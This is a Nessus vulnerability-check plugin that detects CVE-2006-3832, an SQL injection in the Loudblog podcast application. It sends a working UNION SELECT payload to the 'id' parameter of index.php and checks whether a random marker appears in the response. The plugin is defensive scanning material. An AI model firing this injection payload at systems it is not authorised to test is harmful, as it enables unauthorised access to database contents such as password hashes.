#
# (C) Tenable Network Security
#


if (description)
{
  script_id(22091);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2006-3832");
  if (defined_func("script_xref")) script_xref(name:"OSVDB", value:"27442");

  script_name(english:"Loudblog id Parameter SQL Injection Vulnerability");
  script_summary(english:"Checks for id Parameter SQL injection flaw in Loudblog");
 
  desc = "
Synopsis :

The remote web server contains a PHP application that is susceptible
to a SQL injection attack. 

Description :

The remote host is running Loudblog, a PHP application for publishing
podcasts and similar media files. 

The version of Loudblog installed on the remote host fails to sanitize
input to the 'id' parameter of the 'index.php' script before using it
in a database query.  This may allow an unauthenticated attacker to
uncover sensitive information such as password hashes, modify data,
launch attacks against the underlying database, etc. 

Note that successful exploitation is possible regardless of PHP's
'magic_quotes_gpc' setting. 

See also :

http://retrogod.altervista.org/loudblog_05_sql.html
http://loudblog.de/forum/viewtopic.php?id=770

Solution :

Upgrade to Loudblog version 0.5.1 or later.

Risk factor : 

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/loudblog", "/podcast", "/podcasts", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit the flaw.
  magic = rand();
  exploit = string("'UNION/**/SELECT/**/0,0,", magic, ",0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0/*");

  req = http_get(
    item:string(
      dir, "/index.php?",
      "id=", exploit
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # it looks like LifeType and...
    "<!-- Loudblog built this page" >< res &&
    # it uses our string for a link to the posting.
    string('title="Link to posting">', magic, '</a>') >< res
  )
  {
    security_warning(port);
    exit(0);
  }
}
